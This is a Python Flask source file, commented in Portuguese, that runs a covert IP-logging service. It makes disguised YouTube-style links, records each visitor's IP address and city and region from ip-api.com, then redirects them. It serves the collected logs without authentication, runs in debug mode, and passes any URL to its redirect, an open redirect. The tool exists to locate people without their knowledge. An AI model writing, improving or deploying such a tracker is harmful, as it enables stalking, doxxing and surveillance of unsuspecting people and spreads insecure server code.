from flask import Flask, render_template, jsonify, request, redirect
import json
import requests
import random
import string
import os
from datetime import datetime

app = Flask(__name__)

LOG_FILE = 'logs.json'

# Função para gerar o link do YouTube (simulando um vídeo aleatório)
def gerar_link_video():
    video_id = ''.join(random.choices(string.ascii_letters + string.digits, k=11))
    return f"https://www.youtube.com/watch?v={video_id}"

# Página principal
@app.route('/')
def index():
    return render_template('index.html')

# Geração de link com rastreamento
@app.route('/gerar_link', methods=['POST'])
def gerar_link():
    video_url = gerar_link_video()
    link_id = ''.join(random.choices(string.digits, k=18))
    return jsonify({'link': f'{request.host_url}r/{link_id}?v={video_url}'})

# Rota acessada pelo link gerado
@app.route('/r/<link_id>')
def rastrear(link_id):
    video_url = request.args.get('v')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Debug: Verificar se o IP está sendo capturado corretamente
    print(f"IP Capturado: {ip}")

    try:
        resposta = requests.get(f"http://ip-api.com/json/{ip}")
        local = resposta.json()
        cidade = local.get('city', 'Cidade Desconhecida')
        regiao = local.get('regionName', 'Região Desconhecida')
    except Exception as e:
        print(f"Erro ao buscar localização: {e}")
        cidade = 'Cidade Desconhecida'
        regiao = 'Região Desconhecida'

    # Debug: Verificar as variáveis de localização
    print(f"Localização: {cidade}, {regiao}")

    log = {
        "data": str(datetime.now()),
        "ip": ip,
        "localizacao": f"{cidade}, {regiao}",
        "id": link_id
    }

    # Salva no arquivo logs.json
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            dados = json.load(f)
    else:
        dados = []

    dados.append(log)

    with open(LOG_FILE, 'w') as f:
        json.dump(dados, f, indent=4)

    # Redireciona para o link do vídeo
    return redirect(video_url)

# API para retornar os logs
@app.route('/get_logs')
def get_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            dados = json.load(f)
    else:
        dados = []
    return jsonify(dados)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
